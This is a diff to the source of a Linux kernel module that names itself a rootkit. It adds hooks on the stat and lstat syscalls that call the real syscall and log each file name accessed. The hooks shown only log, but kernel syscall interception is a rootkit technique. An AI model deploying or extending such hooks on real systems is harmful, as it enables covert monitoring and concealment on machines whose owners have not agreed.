@@ -6,8 +6,32 @@
 #include <linux/fdtable.h>
 #include <linux/limits.h>
 #include <linux/printk.h>
+#include <linux/stat.h>
 #include <linux/string.h>
 #include <linux/types.h>
+
+static long do_stat(const sysfun_t orig_func, struct pt_regs *const p_regs,
+                    const char *const s_filename, struct __old_kernel_stat *const statbuf)
+{
+    long l_ret               = 0;    // Return value of the real syscall
+    const char *s_filename_k = NULL; // Name of the file
+
+    l_ret = orig_func(p_regs);
+    pr_cont(" = %ld\n", l_ret);
+
+    s_filename_k = strndup_user(s_filename, PATH_MAX);
+
+    IF_U (IS_ERR_OR_NULL(s_filename_k)) {
+        pr_err("[ROOTKIT] * Could not copy filename from user\n");
+        s_filename_k = kstrdup_const("(unknown)", GFP_KERNEL);
+    }
+
+    pr_info("[ROOTKIT] * File name: %s\n", s_filename_k);
+
+    kfree_const(s_filename_k);
+
+    return l_ret;
+}
 
 // sys_open syscall hook handler
 SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, int, i32_flags,
@@ -23,7 +47,6 @@ SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, 
 
     IF_U (IS_ERR_OR_NULL(s_filename_k)) {
         pr_err("[ROOTKIT] * Could not copy filename from user\n");
-        // strncpy(s_filename_k, "(unknown)", PATH_MAX);
         s_filename_k = kstrdup_const("(unknown)", GFP_KERNEL);
     }
 
@@ -49,4 +72,22 @@ SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, 
     }
 
     return l_ret;
+}
+
+// sys_stat syscall hook handler
+SYSCALL_HOOK_HANDLER2(stat, orig_stat, p_regs, const char __user *, s_filename,
+                      struct __old_kernel_stat __user *, p_statbuf)
+{
+    pr_info("[ROOTKIT] stat(%p, %p)", s_filename, p_statbuf);
+
+    return do_stat(orig_stat, p_regs, s_filename, p_statbuf);
+}
+
+// sys_lstat syscall hook handler
+SYSCALL_HOOK_HANDLER2(lstat, orig_lstat, p_regs, const char __user *, s_filename,
+                      struct __old_kernel_stat __user *, p_statbuf)
+{
+    pr_info("[ROOTKIT] lstat(%p, %p)", s_filename, p_statbuf);
+
+    return do_stat(orig_lstat, p_regs, s_filename, p_statbuf);
 }
